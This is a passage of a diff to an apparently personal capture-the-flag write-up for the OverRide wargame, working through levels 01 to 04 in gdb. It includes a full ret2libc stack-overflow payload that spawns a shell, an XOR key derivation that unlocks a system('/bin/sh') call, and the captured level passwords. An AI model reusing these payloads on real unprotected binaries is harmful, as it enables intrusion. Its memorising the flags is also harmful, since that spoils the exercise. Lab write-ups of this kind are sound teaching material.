@@ -180,10 +180,263 @@ stores the value of AL or AX, or EAX in the given memory operand. Register size 
 *stolen from **https://reverseengineering.stackexchange.com/questions/14073/when-do-rep-and-stos-appear-in-compiled-c***
 
 so it does a bzero of 0x10 bytes, therefore buffer size is 16
+### I dont know what the fuck Im doing anymore
+```
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah
+nope, incorrect password...
 
 
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+```
+the saved return address was overritten with **0x37634136**
+```
+(gdb) x/40wx $esp
+0xffffd6b0:     0xffffd6cc      0x00000064      0xf7fcfac0      0x00000001
+0xffffd6c0:     0xffffd8d1      0x0000002f      0xffffd71c      0x41306141
+0xffffd6d0:     0x61413161      0x33614132      0x41346141      0x61413561
+0xffffd6e0:     0x37614136      0x41386141      0x62413961      0x31624130
+0xffffd6f0:     0x41326241      0x62413362      0x35624134      0x41366241
+0xffffd700:     0x62413762      0x39624138      0x41306341      0x63413163
+0xffffd710:     0x33634132      0x41346341      0x63413563      0x37634136
+0xffffd720:     0x41386341      0x64413963      0x31644130      0x00326441
+0xffffd730:     0x00000000      0xffffd71c      0xffffd7bc      0x00000000
+0xffffd740:     0x08048250      0xf7fceff4      0x00000000      0x00000000
+```
+*0xffffd71c - 0xffffd6cc = 0x50 = 80 is our offset*
+```
+(gdb) r < <(python -c 'print "dat_wil\n" + "A" * 80 + "\xcc\xd6\xff\xff"')
+Program received signal SIGILL, Illegal instruction.
+0xffffd70c in ?? ()
+```
+The fuck happened here.
+```
+(gdb) x/40wx $esp
+0xffffd6b0:     0xffffd6cc      0x00000064      0xf7fcfac0      0x00000001
+0xffffd6c0:     0xffffd8d1      0x0000002f      0xffffd71c      0x41414141
+0xffffd6d0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd6e0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd6f0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd700:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd710:     0x41414141      0x41414141      0x41414141      0xffffd6cc
+0xffffd720:     0x0000000a      0xffffd7b4      0xffffd7bc      0xf7fd3000
+0xffffd730:     0x00000000      0xffffd71c      0xffffd7bc      0x00000000
+0xffffd740:     0x08048250      0xf7fceff4      0x00000000      0x00000000
+```
+yep, we need system, exit and a "/bin/sh" string addresses
+```
+(gdb) info proc map
+process 1884
+Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+    0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+    0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+    0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+    0xf7e2b000 0xf7e2c000     0x1000        0x0 
+    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+    0xf7fd0000 0xf7fd4000     0x4000        0x0 
+    0xf7fd8000 0xf7fdb000     0x3000        0x0 
+    0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0xf7e5eb70  exit
+0xf7e5eba0  on_exit
+0xf7e5edb0  __cxa_atexit
+0xf7e5ef50  quick_exit
+0xf7e5ef80  __cxa_at_quick_exit
+0xf7ee45c4  _exit
+0xf7f27ec0  pthread_exit
+0xf7f2d4f0  __cyg_profile_func_exit
+0xf7f4bc30  svc_exit
+0xf7f55d80  atexit
+```
+("A" * 80) + "0xf7e6aed0" + "ret = 0xf7e5eb70" + "0xf7f897ec"
+```
+level01@OverRide:~$cat <(python -c 'print "dat_wil\n"+"A"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"') - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+level01@OverRide:~$ su level02
+Password:PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
+```
+## level03
+```
+level02@OverRide:~$ su level03
+Password:Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+```
+### stack canaries
+**A stack canary is a value placed on the stack so that it will be overwritten by a stack buffer that overflows to the return address. It allows detection of overflows by verifying the integrity of the canary before function return.**
+
+in the end only used to not let us modify eip
+
+```
+   0x080488ba <+96>:    mov    DWORD PTR [esp+0x4],edx
+   0x080488be <+100>:   mov    DWORD PTR [esp],eax
+=> 0x080488c1 <+103>:   call   0x8048530 <__isoc99_scanf@plt>
+```
+executable prints stupid shit then asks for a password, with **scanf(EAX = 0x8048a85 = "%d", EDX = 0xffffd70c)**
+```
+(gdb) i r
+eax            0x8048a85        134515333
+ecx            0x0      0
+edx            0xffffd70c       -10484
+
+(gdb) x/s 0x8048a85
+0x8048a85:       "%d"
+(gdb) x/40wx $esp 
+0xffffd6f0:     0x08048a85      0xffffd70c      0xf7fceff4      0xf7e5ede5
+```
+**The scanf() function returns the number of fields that were successfully converted and assigned.**
+
+with a break before call to function **test**
+```
+0x080488ca <+112>:   mov    DWORD PTR [esp+0x4],0x1337d00d
+0x080488d2 <+120>:   mov    DWORD PTR [esp],eax
 
 
+(gdb) x/40wx $esp
+0xffffd6f0:     0xf7fceff4      0x1337d00d
+```
+that weird nunber is pushed to stack **0x1337d00d = 322424845** along with return of scanf **EAX = 0xf7fceff4**
+```
+0x0804874d <+6>:     mov    eax,DWORD PTR [ebp+0x8]
+   0x08048750 <+9>:     mov    edx,DWORD PTR [ebp+0xc]
+=> 0x08048753 <+12>:    mov    ecx,edx
+   0x08048755 <+14>:    sub    ecx,eax
+   0x08048757 <+16>:    mov    eax,ecx
+```
+**test** is called and **EAX = 0xf7fceff4** and **EDX = 0x1337d00d** then **ECX = EDX**,
+
+And wtf a **ECX = 0x1337d00d - EAX** and EAX comes from: [EBP + 0x8], EDX from [EBP + 0xc]
+```
+(gdb) x/40wx $ebp 
+0xffffd6e8:     0xffffd718      0x080488da      0xf7fceff4      0x1337d00d
+```
+Break after SUB ECX, EAX 
+```
+(gdb) i r
+eax            0x1337d00d       322424845
+ecx            0x0      0
+edx            0x1337d00d       322424845
+```
+*input i gave was 322424845 thats why **EAX = EDX = 0x1337d00d** so **ECX = EDX - EAX = 0x0***
+```
+   0x08048759 <+18>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804875c <+21>:    cmp    DWORD PTR [ebp-0xc],0x15
+   0x08048760 <+25>:    ja     0x804884a 
+```
+The result of the substraction is then compared with **0x15 = 21**, if > 0x15 it jumps to **0x804884a <test+259>**
+
+Else, it does a whole lot of shit, fucking kill me
+
+lots of fucking calls to **decrypt()** function, so Im guessing it's an if else situation maybe, good news is the decrypt function has a call to system("/bin/sh"), also no matter what, the decrypt function is called even in the **jna** case
+
+### JA case
+calls decrypt with a random number
+In the decrypt function, takes some string at **ebp-0xd**, then xors each byte with the difference of input and the weird number
+
+If the result of that shit id **"Congratulations!"**, it gives a shell
+the string it xors with is:
+```
+(gdb) i r
+eax            0xffffd69b       -10597
 
 
+(gdb) x/s 0xffffd69b
+0xffffd69b:      "Q}|u`sfg~sf{}|a3"
+```
+so "Q}|u`sfg~sf{}|a3" XOR KEY = "Congratulations!"
 
+*using **http://xor.pw/#***
+
+Since XOR is associative and commutative
+```
+X XOR KEY = Y
+X XOR (X XOR KEY) = X XOR Y
+(X XOR X) XOR KEY = X XOR Y
+KEY = X XOR Y
+```
+'Q' XOR 'C' = 0x12 = 18, so thats the keeeeey
+
+in the end
+```
+0x1337d00d - input = 0x12
+input = 0x1337d00d - 0x12 = 0x1337CFFB = 322424827
+```
+trying it
+```
+level03@OverRide:~$ ./level03 
+***********************************
+*               level03         **
+***********************************
+Password:322424827
+$ whoami
+level04
+$ cat /home/users/level04/.pass
+kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+```
+## level04
+```
+level03@OverRide:~$ su level04
+Password:kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
+```
+Lots of calls of ptrace, this doesnt look good.
+
+Starts with a **fork**, the parent process executes a ptrace, fucking kill me
+```
+	0x080487ba <+242>:   mov    DWORD PTR [esp+0xc],0x0
+   0x080487c2 <+250>:   mov    DWORD PTR [esp+0x8],0x2c
+   0x080487ca <+258>:   mov    eax,DWORD PTR [esp+0xac]
+   0x080487d1 <+265>:   mov    DWORD PTR [esp+0x4],eax
+   0x080487d5 <+269>:   mov    DWORD PTR [esp],0x3
+   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
+```
+
+then compares return of ptrace with 0xb ???
+```
+	0x080487e1 <+281>:   mov    DWORD PTR [esp+0xa8],eax
+   	0x080487e8 <+288>:   cmp    DWORD PTR [esp+0xa8],0xb
+```
+if it is equal to 0xb, it outputs "No exec() for you" and kills child
+
+so 0xb is for exec() ?
